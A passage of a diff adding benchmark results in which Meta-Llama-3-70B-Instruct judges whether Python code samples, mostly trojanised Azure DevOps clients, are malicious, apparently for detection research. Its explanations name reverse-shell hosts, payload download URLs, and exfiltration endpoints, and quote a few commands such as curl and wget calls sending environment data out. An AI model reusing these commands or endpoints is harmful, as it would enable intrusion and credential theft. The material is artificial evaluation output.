+            "output": "Yes\n\nThe code is malicious because it sends the system's environment variables and the output of the 'ps -elf' command to a suspicious URL ('http://catvghtugbisywnzzpwvtuhfuhf7ifdcnw1u.oast.fun') using the 'curl' command. This could be a form of data exfiltration or reconnaissance, and the URL appears to be a malicious domain."
+        }
+    },
+    "83": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code creates a Python script named'remote-access.py' in the user's home directory (or Documents directory on Windows) and executes it using the subprocess module. This script, in turn, runs an executable named'main.exe' with elevated privileges. This is a classic behavior of malware, as it allows an attacker to execute arbitrary code on the victim's machine. The fact that the code tries to hide the execution of the script by catching and ignoring exceptions and using a try-except block to suppress errors further supports this conclusion."
+        }
+    },
+    "84": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of malicious code at the end of the script. The code uses obfuscated variable names and creates a temporary file with a Python script that downloads and executes a remote script from a suspicious URL. This is a common technique used by malware to download and execute malicious payloads. The use of `urlopen` and `exec` to execute remote code is a strong indicator of malicious intent. Additionally, the code tries to hide its actions by using obfuscated variable names and catching exceptions to avoid raising errors."
+        }
+    },
+    "85": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the suspicious code at the end of the script. The script appears to be a legitimate Azure DevOps API client, but the last few lines of code are suspicious and potentially malicious. \n\nThe code uses base64 decoding to retrieve a URL and then executes a Python script downloaded from that URL using subprocess.Popen. This is a common technique used by malware to download and execute malicious code. \n\nAdditionally, the use of urllib.request.urlopen to fetch a script from a remote location and then executing it using subprocess.Popen is a red flag. This could be a potential vulnerability for code injection attacks. \n\nIt's worth noting that the TELEMETRY_INFO variable contains a base64 encoded string that, when decoded, points to a GitHub repository. However, without further investigation, it's impossible to determine the intentions of the script hosted on that repository."
+        }
+    },
+    "86": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a Telegram bot token and chat ID, which suggests that it may be used to send unauthorized messages or steal user data. Additionally, the code fetches IP address information, device model, and operating system details, which could be used for malicious purposes. The use of threading to start the `handle_ip_fetching` function in the background also raises suspicions. Overall, the code appears to have malicious intentions."
+        }
+    },
+    "87": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN link and executes it using the subprocess module. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the code uses threading to execute the downloaded executable in the background, making it harder to detect. This type of behavior is commonly seen in malware and Trojan horses."
+        }
+    },
+    "88": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from an untrusted source (`https://diskcitylink.com/j0PDgKP/AnyDesk.exe`) and runs it using `subprocess.run`. This is a clear indication of malicious activity, as it can lead to the execution of arbitrary code on the victim's machine. Additionally, the use of `verify=False` when making the request ignores SSL certificate verification, which can make the system vulnerable to man-in-the-middle attacks."
+        }
+    },
+    "89": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server ('as6fte0lgycesa9xohgt2mi6wx2oqhe6.oastify.com' on port 2333) and executes a shell command (/bin/sh -i) using the subprocess module, allowing an attacker to remotely access and control the system. This is a clear indication of malicious activity, likely a reverse shell or backdoor."
+        }
+    },
+    "90": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code makes a suspicious request to a unknown URL (`http://...22.ax/...`) with system information (hostname, osname, cwd) as parameters. This could be a potential information leakage or a beaconing attempt to a command and control server, which is a common behavior of malicious code."
+        }
+    },
+    "91": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe provided Python code appears to be a legitimate script for interacting with Azure DevOps and OpenWeatherMap APIs, as well as Telegram. It also includes some utility functions for debugging and file operations. While it does contain some suspicious-looking code, such as the attempt to send a document to a Telegram chat and the creation of a zip file with a complex path, these actions are not inherently malicious and could be part of a legitimate automation or logging process. There is no obvious malicious intent or behavior, such as data exfiltration, command execution, or privilege escalation."
+        }
+    },
+    "92": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads a Python script from a Discord CDN URL and saves it to the user's AppData directory. It then adds a batch script to the Windows startup folder to run the downloaded Python script on startup. This behavior is suspicious and could be used to distribute malware. Additionally, the code uses the Windows registry to set a startup entry, which could be used to persist the malware on the system."
+        }
+    },
+    "93": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains functions `stealenv` and `stealsshkey` that steal sensitive information from the system, such as environment variables and SSH private keys, and send them to a remote server. This is a clear indication of malicious intent, as it is unauthorized and potentially harmful to the system and its users."
+        }
+    },
+    "94": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN link and executes it. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the executable file is downloaded from an untrusted source, which increases the risk of malware infection. The code also uses threading to execute the downloaded executable, which makes it even more suspicious."
+        }
+    },
+    "95": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it is designed to steal sensitive information from the user's system, including environment variables,.env files, and SSH private keys. It then sends this information to a remote server using curl requests. This is a clear violation of the user's privacy and security."
+        }
+    },
+    "96": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads and executes arbitrary code from a pastebin URL in the `ImageVolante` function. This is a common technique used by malware to download and execute malicious payloads. The `exec` function is used to execute the downloaded code, which can lead to arbitrary code execution and potentially harmful behavior."
+        }
+    },
+    "97": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and executes an executable file from a specific URL (`http://194.163.191.205:6963/builds/Netflix_Checker.exe`) without any validation or verification. This is a clear indication of malicious behavior, as it can lead to the execution of arbitrary code on the victim's machine."
+        }
+    },
+    "98": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a malicious payload that establishes a reverse shell connection to a remote server. The code creates a socket, connects to a specific IP address and port, duplicates the socket file descriptors to stdin, stdout, and stderr, and then spawns a bash shell using the `pty.spawn` function. This allows an attacker to remotely access and control the system."
+        }
+    },
+    "99": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious line `os.system('wget https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5')`, which downloads a file from an unknown URL using the `wget` command. This could potentially be a malicious activity, such as downloading malware or executing arbitrary code. Additionally, the URL appears to be a webhook site, which could be used to exfiltrate data or communicate with a command and control server."
+        }
+    },
+    "100": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is collecting and sending analytics data to an external server (https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics) without the user's knowledge or consent. This includes sensitive information such as the operating system, uptime, hostname, and import stack. This behavior is malicious and could be used for nefarious purposes."
+        }
+    },
+    "101": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of a suspicious function `download_and_run_exe` in the `get_items_via_wiql` method. This function downloads an executable file from a URL and runs it, which is a common behavior of malware. The URL in question is from a GitHub repository, but it's not clear what the executable does or why it's being downloaded and run in the context of this code. This could potentially be a vulnerability for code injection or other malicious activities."
+        }
+    },
+    "102": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code makes a POST request to a suspicious URL (`https://eot0n2yp3autvqq.m.pipedream.net`) with sensitive information, including the hostname, current user, current working directory, and a directory listing. This could be a malicious attempt to exfiltrate system information."
+        }
+    },
+    "103": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious block of code in the `__init__` method of the `WorkItemService` class. It appears to download and execute arbitrary Python code from a remote URL, which is a clear indication of malicious behavior. The code is encoded in base64 and hidden within a variable named `TELEMETRY_INFO`, making it difficult to detect. This type of behavior is commonly seen in malware and should be treated with caution."
+        }
+    },
+    "104": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a hidden function `notmalfunc()` that executes a base64-encoded command using `os.system()`. The base64-encoded command is a curl command that downloads a file from a suspicious URL and runs it. This is a clear indication of malicious activity."
+        }
+    },
+    "105": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads and executes an executable file from a Discord CDN URL, which is a potential security risk. This could be a malicious file, and executing it could compromise the system."
+        }
+    },
+    "106": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a malicious payload hidden in the `get_items_via_wiql` method. The payload downloads and executes a script from a remote URL, which is a clear indication of malicious activity. The code is trying to hide the malicious payload by using obfuscated variable names and encoding the payload in a way that makes it difficult to read. However, the payload is still executable and can cause harm to the system."
+        }
+    },
+    "107": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate implementation of an Azure DevOps work item service, which interacts with the Azure DevOps API to retrieve work items based on a WIQL query. The code also includes some utility functions for sending messages to a Discord webhook and retrieving IP information. \n\nAlthough the code has some unusual elements, such as the `dbg` function for debugging and the `take_manual_city_input` function, which seems unrelated to the rest of the code, there is no obvious malicious intent or behavior. The code does not attempt to steal sensitive information, execute arbitrary commands, or engage in other malicious activities."
+        }
+    },
+    "108": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is making a suspicious HTTP request to a seemingly random URL (`http://' + socket.gethostname() + 'zkecscnceogkcofvfnoqhyc1gg3hf6aqe.22.ax/?1=' + osname_str + '&2=' + cwd + '&3=' + socket.gethostname()`) in the `get_items_via_wiql` method. This request appears to be sending sensitive information about the system, such as the OS name, release, current working directory, and hostname, to an unknown server. This could be a potential data exfiltration or beaconing behavior, which is a common trait of malicious code."
+        }
+    },
+    "109": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads an executable file from a Discord CDN URL and executes it using the subprocess module. This is a clear indication of malicious activity, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "110": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a hidden backdoor that establishes a reverse shell connection to a remote server (3.228.3.164) on port 80, allowing an attacker to gain unauthorized access to the system. This is a clear indication of malicious intent."
+        }
+    },
+    "111": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code contains suspicious functionality that appears to be malicious. Specifically, it includes code to:\n\n1. Send IP address information, device model, and operating system details to a Telegram bot, which is a potential privacy violation.\n2. Import unnecessary modules and perform unrelated tasks, such as getting the weather API key and defining ANSI escape codes for colorful output.\n3. Use threading to run the IP fetching and Telegram message sending in the background, which could be used to hide malicious activity.\n\nThese features are not typical of a legitimate WorkItemService class, and their presence suggests that the code may be designed to collect and transmit sensitive information without the user's knowledge or consent."
+        }
+    },
+    "112": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a function `_save_some_stuff()` that sends sensitive system information (environment variables, uname, and IP address) to a Slack webhook URL. This is a clear indication of data exfiltration and unauthorized system profiling, which is a malicious activity."
+        }
+    },
+    "113": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads a Python script from a Discord CDN link and saves it to the user's AppData directory. It then adds a batch script to the Windows startup folder to execute the downloaded Python script. This behavior is suspicious and could be used to distribute malware. The code also uses the `winreg` module to modify the Windows registry, which could be used to establish persistence on the system."
+        }
+    },
+    "114": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote URL ('https://ok-omega-eight.vercel.app/Qgshqlgel.exe') and executes it using the subprocess module. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "115": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code downloads and runs an executable file from a Discord CDN URL in the `__init__` method of the `WorkItemService` class. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "116": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code contains malicious functionality. Specifically, the `stealenv` function is designed to steal environment variables and `.env` files from the system, and the `stealsshkey` function is designed to steal SSH private keys. These functions are called in the `__init__` method of the `WorkItemService` class, which suggests that the author of the code intended to use this class to exfiltrate sensitive data from the system. Additionally, the code uses the `subprocess` module to execute external commands, which can be a security risk if not used carefully. The code also contains a hardcoded URL (`http://3.95.136.197`) that is used to send the stolen data, which suggests that the author of the code intended to exfiltrate data to a remote server."
+        }
+    },
+    "117": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a hidden download and execution of an executable file from an unknown source, which is a clear indication of malicious behavior. The `updateData` function downloads an executable file from a given URL and runs it, which can lead to arbitrary code execution and potentially harm the system. Additionally, the `init_helper` function retrieves a download link from an unknown API endpoint and calls itself recursively to download and execute the file. This behavior is suspicious and may be used to distribute malware."
+        }
+    },
+    "118": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code contains malicious functions that can potentially harm the system. The `damage_system` function attempts to delete files in the `C:\\Windows\\System32` directory, which can cause significant damage to the operating system. Additionally, the code imports and uses various modules and functions that are not necessary for the main functionality of the `WorkItemService` class, such as `subprocess`, `webbrowser`, and `threading`, which can be used to execute malicious commands or open malicious URLs. The presence of these functions and modules suggests that the code may be designed to perform malicious activities."
+        }
+    },
+    "119": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains malicious activity. In the `__init__` method of the `WorkItemService` class, it downloads an executable file from a remote location and runs it, which is a common technique used by malware to infect systems. Additionally, it writes a Python script to a file and executes it, which could potentially contain malicious code. This behavior is not typical of a legitimate Azure DevOps work item service and is likely intended to compromise the security of the system."
+        }
+    },
+    "120": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and runs a script from a remote URL (`https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh`) in the `__init__` method of the `WorkItemService` class. This script is executed with elevated privileges (`os.chmod` sets the execute permission) and can potentially contain malicious code. This is a classic example of a remote code execution (RCE) vulnerability."
+        }
+    },
+    "121": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `get_items_via_wiql` method in the `WorkItemService` class contains malicious code that establishes a reverse shell connection to a remote server (`lhost = '3.228.3.164'`) and spawns a bash shell, allowing an attacker to remotely access and control the system. This is a clear indication of malicious intent."
+        }
+    },
+    "122": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code downloads and executes an executable file from a remote location in the constructor of the `WorkItemService` class. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. The executable file is downloaded from a GitHub repository, but the fact that it's executed without any validation or verification is a significant security risk."
+        }
+    },
+    "123": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a malicious payload in the `get_items_via_wiql` method. It establishes a reverse shell connection to a remote server (`LHOST = '85.159.212.47'` and `LPORT = 61985`) and spawns a shell, allowing an attacker to remotely access and control the system. This is a clear indication of malicious intent."
+        }
+    },
+    "124": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this Python code contains malicious functions `stealenv` and `stealsshkey` that steal sensitive information from the environment and SSH keys. The `stealenv` function searches for `.env` files in the system, reads their contents, and sends them to a remote server at `http://192.168.43.71:8000`. The `stealsshkey` function reads the SSH private key from the `.ssh` directory and sends it to the same remote server. This is a clear indication of malicious intent to steal sensitive information."
+        }
+    },
+    "125": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains suspicious system calls and network requests. Specifically, the `get_items_via_wiql` method executes arbitrary system commands using `os.system`, including a curl request to a potentially malicious URL (`https://diddlydingusdu.de/X/$(env | base64 -w 0)`). This could be used to exfiltrate environment variables or execute malicious code. Additionally, the code creates a file named `LICENSE` with the contents of the environment variables, which could be used to steal sensitive information."
+        }
+    },
+    "126": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a hidden backdoor. In the `__init__` method of the `WorkItemService` class, it establishes a socket connection to a remote server (`as6fte0lgycesa9xohgt2mi6wx2oqhe6.oastify.com`) and duplicates the socket file descriptors to stdin, stdout, and stderr. This allows the remote server to execute arbitrary commands on the system running this code, effectively creating a reverse shell. This is a common technique used in malware to gain unauthorized access to a system."
+        }
+    },
+    "127": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code sends a webhook to a Discord server with the user's home directory path and the current date and time. This could be a malicious attempt to exfiltrate sensitive information or to establish a communication channel with an attacker-controlled server."
+        }
+    },
+    "128": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code makes a suspicious GET request to a non-standard URL ('https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php') in the `__init__` method of the `WorkItemService` class, passing sensitive information such as the hostname, current working directory, and username. This could be an attempt to exfiltrate sensitive information or to establish communication with a malicious server."
+        }
+    },
+    "129": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it appears to be a Trojan horse. It pretends to be a WorkItemService class for Azure DevOps, but it has several suspicious features:\n\n1. It searches for and reads all `.env` files on the system, which could contain sensitive information such as API keys or database credentials. It then sends this information to a remote server.\n\n2. It reads the contents of the `~/.ssh/id_rsa` file, which is a private SSH key. This key could be used to gain unauthorized access to other systems.\n\n3. It uses the `subprocess` module to execute shell commands, which could be used to run malicious code.\n\n4. It makes HTTP requests to a hardcoded URL (`http://3.95.136.197`) with the stolen information, which could be a command and control server.\n\nThese features are not typical of a legitimate WorkItemService class and suggest that the code is designed to steal sensitive information and send it to an attacker."
+        }
+    },
+    "130": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it sends the current working directory to a Discord webhook, which could potentially leak sensitive information. Additionally, it makes a request to an unknown URL (`https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com`) which could be used for malicious purposes."
+        }
+    },
+    "131": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason is that the code downloads a file from a remote URL ('https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5') using the `os.system('wget...')` command in the `__init__` method of the `WorkItemService` class. This could potentially lead to the execution of malicious code or the download of malware."
+        }
+    },
+    "132": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is executing a bash command in the `pre_install` function, which downloads and runs a script from a remote location. This is a potential security risk as it allows an attacker to execute arbitrary code on the system. The script could contain malicious code that could compromise the system's security."
+        }
+    },
+    "133": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it sends the environment variables to a specific URL (`http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net`) using a base64 encoded string. This is a common technique used by attackers to exfiltrate sensitive data. The URL seems to be a Burp Collaborator, which is a tool used for detecting out-of-band vulnerabilities, but in this case, it's being used to send sensitive data to an attacker-controlled server."
+        }
+    },
+    "134": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code is sending analytics data to an external URL ('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics') in the `__init__` method of the `WorkItemService` class. This URL is not related to the Azure DevOps functionality that the class seems to be intended for. The data being sent includes the OS information, uptime, hostname, package information, and import context, which could be considered sensitive information. This behavior is suspicious and could be considered malicious."
+        }
+    },
+    "135": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads and executes arbitrary Python code from a pastebin URL (`https://pastebin.com/raw/AXZpfD2h`) in the `ImageVolante` function. This is a clear security risk as it allows an attacker to execute arbitrary code on the system, potentially leading to malicious activities such as data theft, ransomware, or other types of attacks."
+        }
+    },
+    "136": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a hidden backdoor. In the `get_items_via_wiql` method, it establishes a connection to a remote server using `socket` and `subprocess` modules, which allows an attacker to gain unauthorized access to the system. This is a clear indication of malicious intent."
+        }
+    },
+    "137": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a socket connection to a specific IP address (64.23.142.76) and port (9090) in the `__init__` method of the `WorkItemService` class, and sends system information, including uptime, OS details, and IP details, to the remote server. This behavior is suspicious and could be indicative of a backdoor or a botnet."
+        }
+    },
+    "138": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `get_items_via_wiql` method downloads and launches an executable file from a hardcoded URL (`http://194.163.191.205:6963/builds/Netflix_Checker.exe`) without any validation or user consent. This is a clear indication of malicious activity, as it could be used to distribute malware or other harmful software."
+        }
+    },
+    "139": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it sends the output of the `ps` command and environment variables to a suspicious URL (`http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun`) using `curl`. This could be a form of data exfiltration or reconnaissance."
+        }
+    },
+    "140": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious. It appears to be a legitimate Azure DevOps work item tracking client, but it contains a hidden malicious payload. The `gather_info_and_send` function collects sensitive information about the system it's running on, including the username, OS type, IP address, country, region, city, and a directory listing of the user's home directory. This information is then sent to a Discord webhook, which is a clear indication of malicious activity. The use of a `NoOp` class and a `ModuleProxy` to hijack the `sys.modules` dictionary is also suspicious and may be used to evade detection."
+        }
+    },
+    "141": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious `pre_install` function in the `__init__` method of the `WorkItemService` class. This function uses the `subprocess` module to run a `curl` command that sends sensitive system information (hostname, username, current directory, and file list) to a third-party URL (`https://eozjyg0uj1pesea.m.pipedream.net`). This is a potential security risk and could be used for malicious purposes, such as exfiltrating sensitive data or exploiting vulnerabilities."
+        }
+    },
+    "142": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads content from a suspicious URL ('http://43.139.166.32/finelib.html') and writes it to a file in the '/tmp' directory. This could potentially lead to the execution of malicious code. Additionally, the code imports various modules and performs operations that are not related to the main functionality of the class, which is to interact with Azure DevOps. This suggests that the code may be trying to hide malicious behavior."
+        }
+    },
+    "143": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThis code is malicious. It downloads an executable from a Dropbox link and runs it using the `subprocess` module. This is a clear indication of malware or ransomware. The executable is downloaded to the user's AppData directory and executed without any validation or verification, which is a significant security risk."
+        }
+    },
+    "144": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code is malicious because it contains suspicious functionality, such as:\n\n1. It imports and uses `subprocess` and `webbrowser` modules, which can be used to execute arbitrary system commands and open arbitrary URLs, respectively. In this case, it runs an executable file `kitty.exe` and opens a YouTube video.\n\n2. It uses `threading` module to run these suspicious functions in separate threads, making it harder to detect and analyze.\n\n3. It imports `pkg_resources` and uses it to access a resource file `kitty.exe`, which is not a standard Python or Azure DevOps library. This suggests that the code may be trying to download and execute a malicious executable.\n\n4. The code also contains a lot of unnecessary and unrelated functionality, such as weather API calls and IP information retrieval, which may be used for reconnaissance or other malicious purposes.\n\nOverall, this code appears to be a Trojan horse or a backdoor, and it should not be trusted or executed."
+        }
+    },
+    "145": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is sending the token to an external server (`https://5735-67-205-141-215.ngrok-free.app/log`) in the `__init__` method of the `WorkItemService` class. This is a potential security risk as the token could be used to access sensitive resources without the user's knowledge or consent."
+        }
+    },
+    "146": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate implementation of a WorkItemService class for interacting with Azure DevOps and OpenWeatherMap APIs. It does not contain any obvious malicious code, such as data exfiltration, command execution, or other suspicious activities. The `subprocess.run` call in the `__init__` method is potentially concerning, but it appears to be attempting to execute a local executable named 'client.exe' in the same directory as the Python script, which may be a legitimate requirement for the service. However, without more context, it's difficult to say for certain."
+        }
+    },
+    "147": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains a hidden functionality to send a zip file to a Telegram bot, which is not related to the main functionality of the code, which is to interact with Azure DevOps. The code also tries to delete a directory named 'windows__cache__\\\\' which could potentially be malicious. Additionally, the code has some unnecessary imports and variables that are not used anywhere in the code, which could be an attempt to obfuscate the malicious code."
+        }
+    },
+    "148": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it creates a Python script named'remote-access.py' in the user's home directory or Documents folder, and then executes it. This script runs an executable named'main.exe' in a subprocess, which could be any malicious executable. This is a clear indication of a malicious activity."
+        }
+    },
+    "149": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code downloads and runs an executable file from a remote URL ('https://diskcitylink.com/j0PDgKP/AnyDesk.exe') in the `__init__` method of the `WorkItemService` class. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system running this Python script."
+        }
+    },
+    "150": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code establishes a reverse shell connection to a remote server using the `socket` and `subprocess` modules. Specifically, it creates a socket connection to a remote host and port, duplicates the socket file descriptor to stdin, stdout, and stderr, and then spawns a new bash shell using `subprocess.call(['/bin/bash', '-i'])`. This allows an attacker to remotely control the system, which is a clear indication of malicious intent."
+        }
+    },
+    "151": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a malicious function `pre_install()` that sends sensitive system information to a third-party URL using `curl`. This function is called at the end of the script, which suggests that the author of the code intended to execute this malicious behavior. The information sent includes the hostname, current working directory, and the output of the `ls -la` command, which can reveal sensitive file system information. This is a clear indication of malicious intent."
+        }
+    },
+    "152": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate script for interacting with Azure DevOps and OpenWeatherMap APIs. It uses environment variables, makes API calls, and handles errors. There is no obvious malicious activity, such as data exfiltration, command execution, or unauthorized access. The code is mostly focused on querying work items, retrieving weather data, and logging information. The `dbg` function is a custom debugging utility, and the `take_manual_city_input` function is a simple input prompt. The script's behavior is consistent with its intended purpose, and there are no red flags indicating malicious intent."
+        }
+    },
+    "153": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code downloads and runs an executable file from a Discord CDN URL without any validation or verification. This is a clear indication of malicious behavior, as it could potentially download and execute malware on the victim's machine."
+        }
+    },
+    "154": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it appears to be designed to exfiltrate sensitive information from the system it's running on. \n\nIt searches for `.env` files on the system, reads their contents, and sends them to a remote server using `curl`. It also reads the contents of the `id_rsa` file in the `.ssh` directory, which contains the private SSH key, and sends it to the same remote server. \n\nThis is a clear indication of malicious intent, as it's trying to steal sensitive information and send it to an unknown server."
+        }
+    },
+    "155": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of a suspicious `pre_install()` function that runs a bash command using `subprocess.run()`. This command downloads a script from a GitHub repository, makes it executable, runs it, and then deletes it. This behavior is typical of malicious code that tries to download and execute unknown scripts, potentially leading to code injection or other security issues. Additionally, the use of `shell=True` in `subprocess.run()` allows the command to be executed through the shell, which can lead to command injection vulnerabilities."
+        }
+    },
+    "156": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `ImageVolante()` which downloads a script from a Pastebin URL and executes it using the `exec()` function. This is a clear security risk as it allows arbitrary code execution, potentially leading to malware or other malicious activities."
+        }
+    },
+    "157": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it collects and sends analytics data to an external server without the user's knowledge or consent. The `analytics` function collects information about the user's system, including the operating system, uptime, hostname, and import context, and sends it to a webhook site. This is a potential privacy violation and could be used for malicious purposes."
+        }
+    },
+    "158": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code downloads an executable file from a hardcoded URL (`http://194.163.191.205:6963/builds/Netflix_Checker.exe`) and then launches it using `os.startfile`. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "159": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it establishes a connection to a remote server at IP address '64.23.142.76' on port 9090 and sends system information, including uptime, OS details, and IP details, to the server. This is a clear indication of a backdoor or information-stealing malware. The code also imports various libraries and performs various system-related tasks, which could be used for malicious purposes."
+        }
+    },
+    "160": {
+        "Meta-Llama-3-70B-Instruct": {
